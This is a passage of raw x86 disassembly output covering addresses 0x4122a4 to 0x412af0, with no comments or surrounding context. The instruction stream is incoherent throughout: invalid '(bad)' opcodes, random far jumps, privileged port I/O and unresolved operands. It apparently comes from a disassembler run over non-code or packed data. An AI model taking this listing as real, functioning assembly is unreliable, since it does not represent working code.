  4122a4:	and    edx,DWORD PTR [ecx+esi*4]
  4122a7:	ficomp WORD PTR [edx-0x4e]
  4122aa:	sbb    DWORD PTR [ebp+0x249e1468],eax
  4122b0:	ret    
  4122b1:	jp     0x412316
  4122b3:	daa    
  4122b4:	and    dl,BYTE PTR [edx-0x2b46d1ed]
  4122ba:	ficom  WORD PTR [ebp+0x6af1162a]
  4122c0:	into   
  4122c1:	sub    esi,DWORD PTR [ecx+0x45c6859e]
  4122c7:	je     0x4122cb
  4122c9:	test   BYTE PTR [ecx+0x3bab373f],dh
  4122cf:	or     al,0x68
  4122d1:	inc    edx
  4122d2:	scas   eax,DWORD PTR es:[edi]
  4122d3:	xor    ah,BYTE PTR ss:[edi+edx*8+0xb]
  4122d8:	inc    ebx
  4122d9:	push   ebx
  4122da:	lods   al,BYTE PTR ds:[esi]
  4122db:	and    esi,DWORD PTR [eax-0x56]
  4122de:	pop    ss
  4122df:	jmp    0x7045:0xa5a50d32
  4122e6:	cmp    dh,BYTE PTR [ebx]
  4122e8:	mov    bl,0x33
  4122ea:	pop    ebp
  4122eb:	fmul   DWORD PTR [ecx]
  4122ed:	fiadd  DWORD PTR [eax-0x3362df92]
  4122f3:	cli    
  4122f4:	jmp    0x1422:0xb7794c6d
  4122fb:	push   eax
  4122fc:	dec    eax
  4122fd:	adc    BYTE PTR [edx-0x19a68644],bl
  412303:	jg     0x41237a
  412305:	mov    al,ds:0xa19974f7
  41230a:	outs   dx,BYTE PTR ds:[esi]
  41230c:	push   esi
  41230d:	jo     0x4122b1
  41230f:	pushf  
  412310:	je     0x41236e
  412312:	pop    eax
  412313:	adc    DWORD PTR [esi],0xffffffb3
  412316:	fistp  QWORD PTR [ecx]
  412318:	outs   dx,DWORD PTR ds:[esi]
  412319:	aaa    
  41231a:	lock sbb al,0xa9
  41231d:	or     esi,esi
  41231f:	sub    al,0x73
  412321:	popa   
  412322:	ret    
  412323:	sbb    eax,0x3ee0d9c
  412328:	jns    0x41239c
  41232a:	jno    0x41239b
  41232c:	sbb    eax,0x1077f61
  412331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412332:	(bad)
  412335:	push   cs
  412336:	gs mov ch,0x7a
  412339:	mov    ch,0x3
  41233b:	cs mov ch,0xc8
  41233e:	cmp    eax,0x88059523
  412343:	int3   
  412344:	sbb    bh,BYTE PTR [edi]
  412346:	test   BYTE PTR [eax-0x5a],al
  412349:	ss pop edx
  41234b:	scas   eax,DWORD PTR es:[edi]
  41234c:	xchg   ecx,eax
  41234d:	jae    0x4123a4
  41234f:	rcl    DWORD PTR [ebp+esi*8+0x5cfc0d7e],0xbd
  412357:	ds aaa 
  412359:	or     al,0x1
  41235b:	xor    eax,0xd94952d0
  412360:	cmp    BYTE PTR [ebx],cl
  412362:	xor    DWORD PTR [ebp-0x77],esp
  412365:	push   0x662a53c6
  41236a:	ret    
  41236b:	pop    esp
  41236c:	inc    edi
  41236d:	clc    
  41236e:	cmp    BYTE PTR [eax+ebp*4],bh
  412371:	and    al,0xbe
  412373:	retf   
  412374:	jmp    0x1726:0xb274ae81
  41237b:	(bad)  
  41237c:	jge    0x412333
  41237e:	int3   
  41237f:	pushf  
  412380:	imul   ebx,DWORD PTR [eax+eax*8-0x5b9610b2],0xcebc9e4f
  41238b:	xchg   ebx,eax
  41238c:	(bad)  
  41238d:	mov    ah,0x4f
  41238f:	jns    0x41238e
  412391:	push   0x48fd22f
  412396:	pop    ds
  412397:	push   esi
  412398:	jne    0x412392
  41239a:	mov    BYTE PTR [edx-0xd],ah
  41239d:	cld    
  41239e:	fcomp  st(1)
  4123a0:	dec    esp
  4123a1:	add    al,0xfa
  4123a3:	push   ss
  4123a4:	adc    al,0x66
  4123a6:	or     al,0xd7
  4123a8:	retf   0x65d3
  4123ab:	pop    esp
  4123ac:	push   ss
  4123ad:	pop    ecx
  4123ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123af:	call   0x6691:0xc7cd1b46
  4123b6:	push   esi
  4123b7:	or     BYTE PTR [esi+0x6],0x50
  4123bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123bc:	aaa    
  4123bd:	je     0x4123a9
  4123bf:	in     eax,0xfe
  4123c1:	pusha  
  4123c2:	and    BYTE PTR [ecx],0x4
  4123c5:	sub    al,0xe
  4123c7:	inc    eax
  4123c8:	and    eax,0xbdd2efb4
  4123cd:	pop    esp
  4123ce:	clc    
  4123cf:	push   cs
  4123d0:	call   0xe22c:0xdfb1e210
  4123d7:	call   0xda0b:0x1a40cdea
  4123de:	adc    edx,eax
  4123e0:	or     eax,0xd54c1e17
  4123e5:	fldenv [ecx+0x71]
  4123e8:	cdq    
  4123e9:	daa    
  4123ea:	out    dx,al
  4123eb:	mov    edi,0x3f463c35
  4123f0:	and    eax,0xecef9587
  4123f5:	loop   0x4123cd
  4123f7:	pop    ebx
  4123f8:	lock cld 
  4123fa:	push   0xde90d1a8
  4123ff:	icebp  
  412400:	ja     0x4123e7
  412402:	mov    dl,0x98
  412404:	(bad)  
  412405:	ror    edx,1
  412407:	lods   eax,DWORD PTR ds:[esi]
  412408:	loop   0x4123b2
  41240a:	out    0x47,eax
  41240c:	and    BYTE PTR [ecx+esi*2],dl
  41240f:	or     BYTE PTR [edi-0x1c],cl
  412412:	imul   edx,DWORD PTR [edx+0x52b3e352],0xb
  412419:	inc    esp
  41241a:	call   FWORD PTR [edx+0x6b]
  41241d:	add    DWORD PTR [ebx+0x3c],ebp
  412420:	add    al,0x42
  412422:	clc    
  412423:	into   
  412424:	std    
  412425:	cli    
  412426:	cmp    al,0x27
  412428:	xor    eax,0xe0d417fe
  41242d:	icebp  
  41242e:	add    al,0x3d
  412430:	enter  0xf5c,0x54
  412434:	push   esi
  412435:	mov    es,ebx
  412437:	sbb    DWORD PTR [esi+0x70d88f7e],esp
  41243d:	popa   
  41243e:	xchg   ebx,ebp
  412440:	sub    ch,BYTE PTR [esi+0x63f88e85]
  412446:	mov    ?,eax
  412448:	call   0xdd66:0x541a
  41244e:	test   al,0xcb
  412450:	fisttp QWORD PTR [edi]
  412452:	int3   
  412453:	sbb    ebp,ebx
  412455:	sbb    eax,0xfb82b087
  41245a:	and    esi,ebx
  41245c:	das    
  41245d:	lds    ebx,FWORD PTR [ecx+0x3d]
  412460:	sbb    BYTE PTR [ebp+0x7b],0x32
  412464:	add    eax,0xca878c10
  412469:	mov    ds,WORD PTR [ebx]
  41246b:	adc    eax,0xec5449db
  412470:	mov    cl,0xed
  412472:	mov    eax,0x31a2ca90
  412477:	inc    ebx
  412478:	adc    BYTE PTR ss:0xf1cd8b2d,bh
  41247f:	cmc    
  412480:	push   ecx
  412481:	retf   
  412482:	push   esi
  412483:	test   BYTE PTR [ecx-0x70],dh
  412486:	sti    
  412487:	mov    ebp,0x2ec967d3
  41248c:	adc    BYTE PTR [eax+0x5d],al
  41248f:	mov    bh,0x54
  412491:	xor    al,0xe6
  412493:	adc    BYTE PTR [esi-0x4ac1d45c],bh
  412499:	adc    DWORD PTR [esi],edx
  41249b:	jb     0x4124be
  41249d:	dec    edi
  41249e:	xor    esi,edx
  4124a0:	aas    
  4124a1:	sbb    dh,BYTE PTR [ebp+0x495bba11]
  4124a7:	loopne 0x4124f0
  4124a9:	repz lea edi,[ecx+0x44]
  4124ad:	test   eax,0xc8508d2e
  4124b2:	mov    dl,0x67
  4124b4:	pop    ebp
  4124b5:	lods   al,BYTE PTR ds:[esi]
  4124b6:	out    0x2f,eax
  4124b8:	mov    eax,0xde75c59c
  4124bd:	repz mov al,0x38
  4124c0:	mov    ebx,0x1645ca97
  4124c5:	sti    
  4124c6:	arpl   si,dx
  4124c8:	call   0x507b:0xace07125
  4124cf:	sar    DWORD PTR [eax-0x603138d9],0x1c
  4124d6:	sbb    BYTE PTR [eax-0x223bc9ab],bh
  4124dc:	aam    0xff
  4124de:	cwde   
  4124df:	or     dh,0xa5
  4124e2:	sar    DWORD PTR [edi-0x4069f0c2],cl
  4124e8:	inc    ebx
  4124e9:	aaa    
  4124ea:	es mov bh,0xf5
  4124ed:	xchg   esi,eax
  4124ee:	jge    0x41254f
  4124f0:	and    eax,ecx
  4124f2:	pop    es
  4124f3:	rcr    al,1
  4124f5:	push   esp
  4124f6:	push   cs
  4124f7:	test   BYTE PTR [edi+eax*4-0x5b],0xe2
  4124fc:	and    ebx,DWORD PTR [edx-0x5b]
  4124ff:	jne    0x4124e0
  412501:	mov    al,0xe2
  412503:	dec    edx
  412504:	and    eax,0xe29a3b64
  412509:	mov    DWORD PTR [ebx+0x2c],edi
  41250c:	fstp   TBYTE PTR [edi+0xc04f778]
  412512:	(bad)  
  412513:	out    dx,eax
  412514:	add    BYTE PTR ds:0x428f18e1,0xe5
  41251b:	es es dec esi
  41251e:	in     al,0xe4
  412520:	mov    eax,0xaac412a4
  412525:	pop    esp
  412526:	mov    ah,0x35
  412528:	sahf   
  412529:	push   eax
  41252a:	in     eax,0x3b
  41252c:	inc    eax
  41252d:	cld    
  41252e:	cmp    ch,BYTE PTR [ebx-0x15]
  412531:	in     al,dx
  412532:	in     al,dx
  412533:	cmp    DWORD PTR [ebp+0xe487b14],edi
  412539:	imul   edi,DWORD PTR [eax+0x59f353ef],0xfa2b89dc
  412543:	sahf   
  412544:	test   al,0xc
  412546:	push   edi
  412547:	pop    esp
  412548:	adc    BYTE PTR [esi-0x6e1ef5af],ah
  41254e:	push   edx
  41254f:	mov    dl,0x68
  412551:	sbb    bl,BYTE PTR [ecx+0x7d4afdf3]
  412557:	mov    edi,0x780d897b
  41255c:	jnp    0x4125d9
  41255e:	hlt    
  41255f:	iret   
  412560:	pop    ebx
  412561:	pop    ds
  412562:	dec    esi
  412563:	inc    ebx
  412564:	and    eax,eax
  412566:	into   
  412567:	xchg   ecx,eax
  412568:	mov    edx,0x73c322cc
  41256d:	jmp    0x412514
  41256f:	pop    ss
  412570:	out    0x5f,al
  412572:	xor    ecx,DWORD PTR [esi+eiz*8]
  412575:	ins    BYTE PTR es:[edi],dx
  412576:	dec    edi
  412577:	xchg   ebx,eax
  412578:	enter  0xa284,0xf
  41257c:	jecxz  0x4125a5
  41257e:	push   edi
  41257f:	and    DWORD PTR [edi+esi*8-0x583d394b],ecx
  412586:	pop    es
  412587:	shl    BYTE PTR [ebp-0x4c3f74db],1
  41258d:	and    ch,BYTE PTR [eax-0x4b83ca3f]
  412593:	stos   BYTE PTR es:[edi],al
  412594:	pop    ss
  412595:	cdq    
  412596:	test   BYTE PTR [ebx+0x3839a503],bl
  41259c:	inc    esi
  41259d:	or     eax,0x141e491c
  4125a2:	sbb    ebp,DWORD PTR [edi+0x5e]
  4125a5:	mov    bh,0xe5
  4125a7:	mov    ecx,DWORD PTR [ebx-0x61]
  4125aa:	mov    esi,0x1598bd40
  4125af:	gs pop ecx
  4125b1:	sub    esi,esi
  4125b3:	mov    al,0xe0
  4125b5:	lahf   
  4125b6:	and    BYTE PTR [ebx],bh
  4125b8:	ds aad 0x53
  4125bb:	fwait
  4125bc:	mul    BYTE PTR [ebp+0x67]
  4125bf:	dec    esp
  4125c0:	adc    dh,BYTE PTR [edi+0x1bfa9a39]
  4125c6:	dec    esp
  4125c7:	dec    eax
  4125c8:	jnp    0x41259e
  4125ca:	out    0x9,eax
  4125cc:	test   DWORD PTR [ebx+ebp*2+0x3860884e],0x52dd2840
  4125d7:	retf   0x6b90
  4125da:	jno    0x4125bb
  4125dc:	sub    eax,0x20c45da
  4125e1:	jb     0x412578
  4125e3:	jge    0x41257b
  4125e5:	retf   
  4125e6:	sub    DWORD PTR [ecx-0x2a],ebp
  4125e9:	pop    eax
  4125ea:	mov    edx,0x11b62199
  4125ef:	push   0xffffff8c
  4125f1:	clc    
  4125f2:	mov    fs,WORD PTR [edi+0x3a386ff4]
  4125f8:	call   0xf8ea:0xcb02853f
  4125ff:	icebp  
  412600:	push   ebx
  412601:	jmp    0x940abd04
  412606:	push   0x9237e2bc
  41260b:	xchg   esi,eax
  41260c:	jmp    0x4125f0
  41260e:	xor    al,0x41
  412610:	and    BYTE PTR [edx],ah
  412612:	lods   eax,DWORD PTR ds:[esi]
  412613:	pop    eax
  412614:	jno    0x412611
  412616:	idiv   BYTE PTR [esp+eax*8-0x38]
  41261a:	add    bl,BYTE PTR ds:0x747b88b2
  412620:	das    
  412621:	sub    eax,0x47df5d36
  412626:	stc    
  412627:	jno    0x4125b1
  412629:	loopne 0x4125f2
  41262b:	adc    al,BYTE PTR [edi-0x297de636]
  412631:	jge    0x4125be
  412633:	dec    ebx
  412634:	dec    ebx
  412635:	jg     0x4125d9
  412637:	iret   
  412638:	and    edx,DWORD PTR [edi+eiz*1]
  41263b:	push   edi
  41263c:	mov    ?,WORD PTR ds:0x5247525d
  412642:	and    al,0xe0
  412644:	mov    al,0x3d
  412646:	ret    0xdccb
  412649:	(bad)  
  41264a:	ja     0x4126bd
  41264c:	cwde   
  41264d:	gs mov edx,0x3f596a9f
  412653:	inc    eax
  412654:	push   ebx
  412655:	inc    esp
  412656:	add    DWORD PTR [ebx+0x1e1ce078],esi
  41265c:	xlat   BYTE PTR ds:[ebx]
  41265d:	sub    BYTE PTR [edi-0x24],dh
  412660:	push   0xffffff9c
  412662:	les    ebx,FWORD PTR [ebx]
  412664:	add    al,0x9e
  412666:	fwait
  412667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412668:	pop    ebx
  412669:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41266a:	fs dec edi
  41266c:	adc    esp,DWORD PTR [ebp+0x72f7d823]
  412672:	sub    BYTE PTR [edx],bl
  412674:	aam    0xe8
  412676:	jp     0x412652
  412678:	call   0x3d976080
  41267d:	dec    eax
  41267e:	inc    edx
  41267f:	pop    ss
  412680:	jle    0x412612
  412682:	loope  0x412681
  412684:	inc    ebp
  412685:	jbe    0x4126dd
  412687:	xchg   ebx,eax
  412688:	adc    al,0xc3
  41268a:	dec    ecx
  41268b:	mov    edx,0xd5aac1df
  412690:	gs lahf 
  412692:	sti    
  412693:	add    DWORD PTR [ecx-0x770a8ee],esp
  412699:	xor    edx,DWORD PTR [edx-0x2c524080]
  41269f:	inc    edx
  4126a0:	shr    BYTE PTR [esi],0x71
  4126a3:	das    
  4126a4:	jp     0x4126ea
  4126a6:	pop    ebp
  4126a7:	mov    al,ds:0x62390f4b
  4126ac:	mov    ds,WORD PTR [ecx]
  4126ae:	mov    esi,ebx
  4126b0:	mov    esp,0x31410c63
  4126b5:	in     al,dx
  4126b6:	mov    ah,0xea
  4126b8:	(bad)  
  4126b9:	test   al,0x69
  4126bb:	push   ebp
  4126bc:	add    DWORD PTR [ecx],0xfffffff1
  4126bf:	pop    ds
  4126c0:	xor    DWORD PTR [edx-0x18171182],eax
  4126c6:	mov    edx,0xd7cfe76a
  4126cb:	xor    al,0xb0
  4126cd:	sub    ah,BYTE PTR [esi+ecx*8]
  4126d0:	sbb    ch,dh
  4126d2:	cmp    cl,0x5a
  4126d5:	in     eax,dx
  4126d6:	call   DWORD PTR [edi+0x70]
  4126d9:	xchg   esp,eax
  4126da:	inc    eax
  4126db:	adc    eax,0x20c9186a
  4126e0:	popa   
  4126e1:	and    bh,al
  4126e3:	jg     0x412750
  4126e5:	outs   dx,BYTE PTR ds:[esi]
  4126e6:	sub    ecx,DWORD PTR [ecx]
  4126e8:	(bad)  
  4126e9:	push   eax
  4126ea:	std    
  4126eb:	(bad)  
  4126ec:	mov    BYTE PTR [eax+edx*2-0x6d],dh
  4126f0:	add    eax,0x59ed29fc
  4126f5:	jae    0x4126ce
  4126f7:	jg     0x41273e
  4126f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126fa:	(bad)  
  4126fb:	and    eax,0xb2f91160
  412700:	fs mov bh,0xa6
  412703:	std    
  412704:	mov    al,0xab
  412706:	mov    WORD PTR [edx+0x4e],?
  412709:	setg   BYTE PTR [ebp+0x52]
  41270d:	call   0xb873bbf8
  412712:	mov    al,0x3c
  412714:	adc    BYTE PTR [eax+eax*2],bh
  412717:	jmp    0x41276d
  412719:	lock das 
  41271b:	mov    ebx,0x9a9a2366
  412720:	mov    ebx,0x71e22302
  412725:	std    
  412726:	push   eax
  412727:	jl     0x41271e
  412729:	sbb    BYTE PTR [edi-0x261148e6],dl
  41272f:	add    bh,BYTE PTR [ebp+ebx*4-0x15]
  412733:	xchg   esi,eax
  412734:	pop    ecx
  412735:	ja     0x41275e
  412737:	jne    0x4126d7
  412739:	aas    
  41273a:	mov    al,ds:0xb98c81ff
  41273f:	sub    al,BYTE PTR [ebx+0x1be634f0]
  412745:	lea    edx,[edi]
  412747:	jecxz  0x41273f
  412749:	and    BYTE PTR [edx+0xd],bh
  41274c:	lock fcomp DWORD PTR [esi-0x2b]
  412750:	sbb    al,BYTE PTR [esi]
  412752:	push   cs
  412753:	daa    
  412754:	cmp    ebx,DWORD PTR ds:0x39a7ad82
  41275a:	adc    bl,BYTE PTR [ebp-0x20]
  41275d:	xchg   ecx,eax
  41275e:	into   
  41275f:	jns    0x41275c
  412761:	fiadd  WORD PTR [ebx*4+0x51335f99]
  412768:	sub    DWORD PTR [esi-0x71],0x56e95ff7
  41276f:	sbb    BYTE PTR [edx+eiz*2-0x1524b56a],al
  412776:	(bad)  
  412777:	mov    esp,0x945b862c
  41277c:	and    bl,BYTE PTR [edi]
  41277e:	out    dx,al
  41277f:	les    ecx,FWORD PTR [ecx+ecx*1]
  412782:	mov    ecx,DWORD PTR [eax-0x6e]
  412785:	mov    ebx,0x419f1a8f
  41278a:	outs   dx,BYTE PTR ds:[esi]
  41278b:	inc    eax
  41278c:	cmp    BYTE PTR [ebp+0x60],dh
  41278f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412790:	loopne 0x412767
  412792:	mov    dh,0x8b
  412794:	and    eax,0x201537a9
  412799:	aas    
  41279a:	shr    BYTE PTR [esi-0x51],0x76
  41279e:	mov    es,WORD PTR [ecx]
  4127a0:	aam    0xfb
  4127a2:	sub    DWORD PTR [eax],0xffffff89
  4127a5:	loopne 0x4127e0
  4127a7:	ds out 0x31,eax
  4127aa:	cmp    al,0x23
  4127ac:	jbe    0x4127b5
  4127ae:	xchg   ebp,eax
  4127af:	pop    ecx
  4127b0:	mov    ebp,0xea6e72f4
  4127b5:	scas   eax,DWORD PTR es:[edi]
  4127b6:	(bad)  [esi-0xd]
  4127b9:	lds    eax,FWORD PTR [ebp-0x7388fe8b]
  4127bf:	or     DWORD PTR [ebx+esi*2-0x6d],edx
  4127c3:	aad    0xc0
  4127c5:	fild   QWORD PTR es:0xd18303da
  4127cc:	dec    ebp
  4127cd:	add    bh,BYTE PTR [ecx+0x50]
  4127d0:	nop
  4127d1:	dec    BYTE PTR [edi+0x1e]
  4127d4:	stc    
  4127d5:	mov    bh,0xc
  4127d7:	addr16 push eax
  4127d9:	push   edx
  4127da:	mov    cl,0x7a
  4127dc:	sub    dl,ah
  4127de:	mov    edi,0x94d63f07
  4127e3:	test   al,0xba
  4127e5:	addr16 inc edi
  4127e7:	popa   
  4127e8:	xchg   ebx,eax
  4127e9:	mov    ebx,0xa872960e
  4127ee:	mov    esp,0x44bc5ea
  4127f3:	and    edx,esp
  4127f5:	pop    ss
  4127f6:	mov    dh,0x78
  4127f8:	cmp    al,0xd
  4127fa:	mov    ch,0xc9
  4127fc:	fld    TBYTE PTR [eax+0x52]
  4127ff:	cmp    eax,0xa21d2114
  412804:	out    dx,al
  412805:	ret    
  412806:	jns    0x41282c
  412808:	addr16 (bad) 
  41280a:	mov    eax,ds:0xf451e028
  41280f:	lea    edi,[edi+eax*8]
  412812:	in     eax,dx
  412813:	sar    DWORD PTR [ebx-0x2e],cl
  412816:	test   DWORD PTR [edi+0x25],eax
  412819:	cmp    BYTE PTR [esi],bh
  41281b:	fst    QWORD PTR [ebx-0x7c]
  41281e:	dec    ebx
  41281f:	mov    cl,0x88
  412821:	cmp    BYTE PTR [edx],dh
  412823:	clc    
  412824:	fwait
  412825:	mov    dh,bl
  412827:	test   eax,0x2282416d
  41282c:	les    ebp,FWORD PTR [ebx]
  41282e:	enter  0xac52,0xde
  412832:	fiadd  WORD PTR [edi+0x27826026]
  412838:	loope  0x4127d7
  41283a:	js     0x412846
  41283c:	pop    edx
  41283d:	shl    DWORD PTR [edx],cl
  41283f:	loopne 0x4127ee
  412841:	les    ecx,FWORD PTR [esi]
  412843:	test   al,0xe
  412845:	sub    eax,edi
  412847:	jbe    0x412840
  412849:	add    al,0x88
  41284b:	xor    eax,0x97829a3e
  412850:	hlt    
  412851:	hlt    
  412852:	mov    eax,ds:0x2e4291f5
  412857:	xor    al,0x69
  412859:	xor    al,0x5
  41285b:	rcr    BYTE PTR [ebp+edi*8+0x48],1
  41285f:	inc    ecx
  412860:	out    dx,eax
  412861:	push   eax
  412862:	retf   
  412863:	ds retf 0x40c6
  412867:	or     ah,BYTE PTR [edx]
  412869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41286a:	adc    DWORD PTR [esp+edi*1],ebp
  41286d:	dec    edx
  41286e:	mov    ebp,0xb07d2902
  412873:	mov    ebx,0xd8f2856c
  412878:	out    dx,eax
  412879:	iret   
  41287a:	xor    DWORD PTR [ebx-0x4d],ecx
  41287d:	xor    edi,DWORD PTR [edx+edi*1-0x17]
  412881:	sub    eax,0x4da0bb03
  412886:	jbe    0x412849
  412888:	fs call 0xe79267dd
  41288e:	test   DWORD PTR [edi+0x3a],edx
  412891:	je     0x412909
  412893:	in     eax,0xd0
  412895:	jnp    0x412907
  412897:	popf   
  412898:	(bad)  
  412899:	jo     0x412860
  41289b:	and    eax,0xc02a4a39
  4128a0:	dec    esi
  4128a1:	repnz cmp edi,DWORD PTR [ebx]
  4128a4:	rcl    eax,1
  4128a6:	(bad)  
  4128a7:	pop    ebp
  4128a8:	loope  0x412841
  4128aa:	std    
  4128ab:	test   BYTE PTR [esi+0x6e41a96e],0xd9
  4128b2:	push   esp
  4128b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128b4:	daa    
  4128b5:	out    0xfd,eax
  4128b7:	fnstenv [eax-0x53]
  4128ba:	enter  0x8e01,0x84
  4128be:	pop    es
  4128bf:	outs   dx,DWORD PTR ds:[esi]
  4128c0:	retf   0x259c
  4128c3:	mov    ebp,0x51b0d572
  4128c8:	dec    ecx
  4128c9:	cmp    dl,dh
  4128cb:	nop
  4128cc:	fs jg  0x41293d
  4128cf:	pop    ebx
  4128d0:	cmp    al,0xe6
  4128d2:	and    DWORD PTR [eax+ebp*1+0x99a16af],edx
  4128d9:	mov    ecx,DWORD PTR [edi+0x38]
  4128dc:	cmc    
  4128dd:	jg     0x41286f
  4128df:	mov    al,ds:0x1a90590
  4128e4:	or     edx,edx
  4128e6:	or     ebp,DWORD PTR [ecx+eax*1+0x24f17b13]
  4128ed:	and    al,0xbb
  4128ef:	push   0x13a3c455
  4128f4:	popf   
  4128f5:	xchg   esp,eax
  4128f6:	dec    ebx
  4128f7:	push   cs
  4128f8:	shl    bl,0x3
  4128fb:	dec    eax
  4128fc:	or     ebp,DWORD PTR [ecx+0x77]
  4128ff:	mov    dh,0x34
  412901:	pop    es
  412902:	sbb    al,0x78
  412904:	je     0x412963
  412906:	pop    ds
  412907:	jl     0x4128f4
  412909:	shl    BYTE PTR [edx+0x44],1
  41290c:	xchg   ebx,eax
  41290d:	push   cs
  41290e:	jns    0x41295c
  412910:	pop    edi
  412911:	ins    BYTE PTR es:[edi],dx
  412912:	push   ss
  412913:	lea    edx,[ecx-0x748cbf9e]
  412919:	inc    esi
  41291a:	jg     0x4128de
  41291c:	imul   ebx,edi,0xffffffc3
  41291f:	in     al,dx
  412920:	push   ecx
  412921:	xchg   esi,eax
  412922:	pop    ecx
  412923:	mov    dl,0x53
  412925:	dec    ebx
  412926:	test   BYTE PTR ds:0x7311e360,dl
  41292c:	test   al,0x70
  41292e:	(bad)  
  41292f:	pop    edi
  412930:	shl    ch,cl
  412932:	xchg   BYTE PTR [esi-0x37],bh
  412935:	jnp    0x412908
  412937:	idiv   edi
  412939:	es stos BYTE PTR es:[edi],al
  41293b:	ror    BYTE PTR [esi-0x4f],0x3d
  41293f:	add    eax,ecx
  412941:	test   BYTE PTR ds:0x125d0acc,dl
  412947:	test   al,0xab
  412949:	adc    eax,0xecb7181d
  41294e:	in     al,0x13
  412950:	inc    ebp
  412951:	out    0x97,eax
  412953:	mov    ebp,0xca90ada7
  412958:	cli    
  412959:	out    dx,al
  41295a:	out    dx,eax
  41295b:	aad    0x7a
  41295d:	and    eax,0xe50a7203
  412962:	aas    
  412963:	sub    eax,0xaf4d9de0
  412968:	jge    0x412928
  41296a:	mov    WORD PTR [ecx],?
  41296c:	cs call 0xd780:0x90f0b76
  412974:	add    al,BYTE PTR [edi+0x3a5b994d]
  41297a:	mov    bh,0xb3
  41297c:	cmp    DWORD PTR [ecx+ebp*2-0x67],eax
  412980:	add    DWORD PTR [eax-0x4784be4f],0x61
  412987:	and    eax,0xdd4ec768
  41298c:	clc    
  41298d:	jl     0x4129a6
  41298f:	xor    edi,DWORD PTR [eax+0x4a]
  412992:	aaa    
  412993:	(bad)
  412996:	les    esi,FWORD PTR [edi]
  412998:	pop    eax
  412999:	push   eax
  41299a:	enter  0x231,0x6a
  41299e:	shl    BYTE PTR [eax-0x4285dcdf],0xef
  4129a5:	adc    edi,DWORD PTR [edx+0x79]
  4129a8:	cmp    esi,DWORD PTR [eax-0x41]
  4129ab:	sub    al,0x45
  4129ad:	imul   BYTE PTR [edx+eiz*4+0x3c7046fb]
  4129b4:	or     eax,0xccb4cfa2
  4129b9:	(bad)  
  4129ba:	shr    DWORD PTR [ebx+0x8bd0291],1
  4129c0:	add    eax,0x18584c75
  4129c5:	lods   al,BYTE PTR ds:[si]
  4129c7:	(bad)  [eax]
  4129c9:	out    dx,eax
  4129ca:	cdq    
  4129cb:	push   0x2ba4bac6
  4129d0:	out    0x4d,eax
  4129d2:	adc    bh,ch
  4129d4:	fadd   DWORD PTR [edx-0x4c1a26b1]
  4129da:	cmp    eax,0x7c5e888d
  4129df:	push   0x937737d5
  4129e4:	xchg   BYTE PTR [ebx-0x6c6db56a],bh
  4129ea:	and    al,0xbd
  4129ec:	and    DWORD PTR [ebx-0x80],ebp
  4129ef:	sbb    DWORD PTR [edi-0x16993b08],edi
  4129f5:	sbb    eax,0x8b45373b
  4129fa:	inc    esp
  4129fb:	(bad)  
  4129fc:	outs   dx,DWORD PTR ds:[esi]
  4129fd:	dec    eax
  4129fe:	and    bl,BYTE PTR [ecx-0x2958e5d3]
  412a04:	jo     0x4129e6
  412a06:	in     al,dx
  412a07:	push   0x7f87993f
  412a0c:	jp     0x4129fc
  412a0e:	add    bh,cl
  412a10:	or     al,0x50
  412a12:	or     BYTE PTR [edi+ebx*1],ch
  412a15:	and    eax,0xa297a79
  412a1a:	jmp    0x3ad8:0x52c75d50
  412a21:	mov    esi,0x8492838
  412a26:	xchg   ebp,eax
  412a27:	mov    eax,ds:0x37c1909b
  412a2c:	jle    0x412a8d
  412a2e:	jp     0x4129c5
  412a30:	fdivr  DWORD PTR [edx-0x79ea3df]
  412a36:	mov    ebx,0xaba6ab26
  412a3b:	bound  esp,QWORD PTR [edx]
  412a3d:	call   0x5eb9:0xb1db9730
  412a44:	lock retf 
  412a46:	add    DWORD PTR [ecx-0x35689c43],eax
  412a4c:	sti    
  412a4d:	xor    DWORD PTR [ebp+0x41],ebp
  412a50:	and    eax,0xe9855f4b
  412a55:	pop    edi
  412a56:	cmp    ch,dl
  412a58:	mov    ds:0xb2eaeaaa,eax
  412a5d:	mov    bl,0x24
  412a5f:	cmc    
  412a60:	cmp    BYTE PTR ds:0x45cdc25,0xf2
  412a67:	popa   
  412a68:	fld    st(7)
  412a6a:	push   eax
  412a6b:	test   al,0xff
  412a6d:	cmp    edx,DWORD PTR [edi]
  412a6f:	test   BYTE PTR [eax+0x28c4c38d],0xc1
  412a76:	sbb    esi,DWORD PTR [ebx+ebx*4+0x73]
  412a7a:	push   esp
  412a7b:	push   ds
  412a7c:	jge    0x412afc
  412a7e:	pop    eax
  412a7f:	pop    ebp
  412a80:	test   BYTE PTR [eax+0x49],0x61
  412a84:	add    ch,BYTE PTR [eax]
  412a86:	pop    eax
  412a87:	sbb    al,0xc9
  412a89:	jle    0x412a9b
  412a8b:	mov    ebp,0xe28b55fb
  412a90:	test   BYTE PTR [esi-0x41f96161],bl
  412a96:	hlt    
  412a97:	das    
  412a98:	add    BYTE PTR [esi],ah
  412a9a:	clc    
  412a9b:	sti    
  412a9c:	aam    0xaf
  412a9e:	and    BYTE PTR [edx+0x69],0xcc
  412aa2:	dec    ecx
  412aa3:	xchg   ebp,eax
  412aa4:	adc    eax,0x83a2172e
  412aa9:	jge    0x412ac5
  412aab:	xchg   edi,eax
  412aac:	nop
  412aad:	call   0xaba2deaa
  412ab2:	ret    0x297c
  412ab5:	dec    ebx
  412ab6:	and    WORD PTR [eax],sp
  412ab9:	and    eax,0x3f809a52
  412abe:	loop   0x412a8a
  412ac0:	and    ah,BYTE PTR [ebp-0x1d]
  412ac3:	pusha  
  412ac4:	jmp    0x5ac8:0xf27303ce
  412acb:	mov    dl,0x16
  412acd:	retf   0xd518
  412ad0:	add    BYTE PTR [ebx-0x2b0f0cee],dl
  412ad6:	mov    esp,DWORD PTR [eax+0x46beb443]
  412adc:	jp     0x412a8f
  412ade:	pop    ds
  412adf:	addr16 and edi,ebp
  412ae2:	or     eax,eax
  412ae4:	lds    esp,FWORD PTR [eax-0x46]
  412ae7:	jmp    0x7e99:0x2359d3ec
  412aee:	out    0xb,al
  412af0:	dec    ecx
